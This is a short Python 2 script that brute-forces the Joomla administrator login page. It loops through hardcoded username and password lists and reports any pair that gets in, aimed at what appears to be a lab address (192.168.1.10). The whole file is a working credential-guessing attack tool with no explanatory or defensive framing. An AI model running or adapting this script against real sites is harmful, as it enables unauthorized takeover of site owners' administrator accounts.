import mechanize, cookielib, re

def joomlabrute(site, user, passwd):
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	cj = cookielib.LWPCookieJar()
	br.set_cookiejar(cj)
	wordpress = site + 'administrator/index.php'
	wordpress1 = br.open(wordpress)
	br.select_form(nr=0)
	br.form['username'] = user 
	br.form['passwd'] = passwd
	br.submit()
	#br.submit()


	print 'trying' + user+':'+passwd
	html = br.response().readlines()
	for line in html:
		if re.findall('<span class="logo">', line):
			print "Cracked ==> %s:%s:%s" % (site, user, passwd)
	


passwdlist = ['123456', 'admin', '1997715', 'password']
userlist = ['mohamed', 'admin', 'user']
site = 'http://192.168.1.10/joomla2527/'

for user in userlist:
	for passwd in passwdlist:
		joomlabrute(site, user, passwd)
